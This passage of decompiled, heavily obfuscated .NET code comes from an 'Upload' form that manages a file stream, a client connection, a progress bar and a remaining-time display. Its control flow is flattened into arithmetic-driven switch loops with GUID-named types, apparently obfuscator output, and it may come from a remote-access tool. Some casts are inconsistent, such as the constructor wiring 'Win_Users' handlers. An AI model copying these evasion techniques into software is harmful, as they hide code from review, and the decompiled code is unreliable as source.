              if (((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).Upstream != (long) Conversions.ToInteger(((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).SPL[1]))
                goto label_5;
              else
                goto case 3;
            case 1:
              goto label_20;
            case 2:
              num4 = (int) num6 * 1804961809 ^ -135612570;
              continue;
            case 3:
              num4 = 2102563903;
              continue;
            case 4:
              ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).FileStream.Dispose();
              ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).FileStream.Close();
              num4 = (int) num6 * 1194458153 ^ -1307003066;
              continue;
            case 5:
              goto label_22;
            case 6:
              goto label_24;
            default:
              goto label_18;
          }
        }
      }
label_22:
      return;
label_18:;
    }

    private void Upload_Closing(object sender, CancelEventArgs e)
    {
      this.TimeFinish.Enabled = false;
label_1:
      int num1 = 1136788592;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((~(num1 * 1274637557) - 685560071 * (-1214520305 - 795310963 ^ -1892016281 - 137693049)) * 918641093)) % 8U)
        {
          case 0:
            ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).classClient.Close(((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).Client);
            num1 = (int) num2 * -1923454392 ^ 399003729;
            continue;
          case 1:
            ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).FileStream.Close();
            num1 = (int) num2 * 1768898207 ^ -962012259;
            continue;
          case 2:
            ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).FileStream.Dispose();
            num1 = (int) num2 * -900817522 ^ 917010976;
            continue;
          case 4:
            int num3;
            num1 = num3 = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).FileStream == null ? 1162647866 : (num3 = 1924804531);
            continue;
          case 5:
            this.Progr.Enabled = false;
            int num4 = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).classClient == null ? 1537823757 : (num4 = 784069243);
            num1 = num4 ^ (int) num2 * 387595308;
            continue;
          case 6:
            // ISSUE: reference to a compiler-generated field
            ((Data._Closure\u0024__39\u002D8) ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).classClient).qit = true;
            num1 = (int) num2 * -842871203 ^ 1259516091;
            continue;
          case 7:
            goto label_1;
          default:
            goto label_10;
        }
      }
label_10:
      if (this.Bgworker == null)
        return;
      try
      {
        this.Bgworker.Dispose();
label_12:
        int num5 = -828464975;
        while (true)
        {
          uint num6;
          switch ((num6 = (uint) ((~(num5 * 1274637557) - 685560071 * (-1214520305 - 795310963 ^ -1892016281 - 137693049)) * 918641093)) % 3U)
          {
            case 0:
              goto label_3;
            case 1:
              this.Bgworker.CancelAsync();
              num5 = (int) num6 * -1933984363 ^ 1866855635;
              continue;
            case 2:
              goto label_12;
            default:
              goto label_17;
          }
        }
label_3:
        return;
label_17:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void TimeFinish_Tick(object sender, EventArgs e)
    {
      if (this.DGV0.Rows.Count <= 0)
        return;
label_1:
      int num1 = 393664036;
      long num2;
      string time;
      DateTime dateTime1;
      DateTime dateTime2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (~~(num1 * -2037424543) - ~-1590138114 * -1581493275)) % 15U)
        {
          case 0:
            dateTime1 = dateTime1.AddMinutes((double) dateTime2.Minute);
            num1 = (int) num3 * -878741171 ^ 1189353338;
            continue;
          case 1:
            ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).stop_time = DateAndTime.Now;
            num1 = (int) num3 * 1795302324 ^ -1823138231;
            continue;
          case 2:
            int num4 = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._stream >= ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).TotalSize ? -680958578 : (num4 = 70738682);
            num1 = num4 ^ (int) num3 * 1117959067;
            continue;
          case 3:
            dateTime2 = Convert.ToDateTime(time);
            num1 = (int) num3 * 2008861642 ^ 24650569;
            continue;
          case 4:
            this.Close();
            num1 = -108874347;
            continue;
          case 5:
            this.DGV0.Rows[4].Cells[1].Value = (object) string.Format(EXGuarder.\u00327182277, (object) time, (object) dateTime1.ToString(EXGuarder.\u003370A6873));
            num1 = (int) num3 * -1572483253 ^ 1137000780;
            continue;
          case 6:
            ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).elapsed_time = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).stop_time.Subtract(((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).start_time);
            num2 = checked ((long) Math.Round(unchecked ((double) checked (((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).TotalSize - ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._stream) * ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).elapsed_time.TotalSeconds / (double) ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._stream)));
            num1 = (int) num3 * -276355053 ^ -1947798603;
            continue;
          case 7:
            goto label_17;
          case 8:
            int num5 = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._stream <= 0L ? 159120185 : (num5 = -1226252657);
            num1 = num5 ^ (int) num3 * -920791506;
            continue;
          case 9:
            dateTime1 = dateTime1.AddHours((double) dateTime2.Hour);
            num1 = (int) num3 * 1870649542 ^ 429429418;
            continue;
          case 10:
            dateTime1 = dateTime1.AddSeconds((double) dateTime2.Second);
            num1 = (int) num3 * 745290017 ^ -774916822;
            continue;
          case 11:
            goto label_1;
          case 12:
            dateTime1 = DateTime.Now;
            num1 = (int) num3 * -1308120034 ^ -634703736;
            continue;
          case 13:
            int num6 = time.Equals(EXGuarder.\u003772D356F) ? 595327907 : (num6 = -1296279780);
            num1 = num6 ^ (int) num3 * 338363101;
            continue;
          case 14:
            time = Codes.ToTime(num2);
            num1 = (int) num3 * -577474281 ^ -295808921;
            continue;
          default:
            goto label_18;
        }
      }
label_17:
      return;
label_18:;
    }

    private void Progr_Tick(object sender, EventArgs e)
    {
      if (!(((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._stream != 0L | ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._stream > (long) this.ProgressBar1.Maximum))
        return;
label_1:
      int num1 = 855810490;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) -(141001496 - -1628823327 - (~num2 * -1288516049 ^ -618165325 * (900222005 - -2116200245) ^ ~--1763679910) * 1802496173)) % 3U)
        {
          case 0:
            goto label_5;
          case 1:
            this.ProgressBar1.Value = checked ((int) ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._stream);
            num1 = (int) num3 * -1097743846 ^ -474427044;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    public Upload()
    {
      this.Load += new EventHandler(((Win_Users) this).Win_Users_Load);
      this.Closing += new CancelEventHandler(((Win_Users) this).Win_Users_Closing);
      ((Win_Users) this).InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          return;
label_1:
        int num1 = 1388409241;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~((num1 ^ ~(-1288502921 * ~-(884505627 + 1729581049))) - -577571863 * (716632683 + ~-1262019679) * 1032763473) * -394942619)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              int num3 = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).components == null ? 306058833 : (num3 = 750754514);
              num1 = num3 ^ (int) num2 * -1847426486;
              continue;
            case 2:
              ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).components.Dispose();
              num1 = (int) num2 * -1323390965 ^ -1266084135;
              continue;
            case 3:
              goto label_3;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }
  }
}
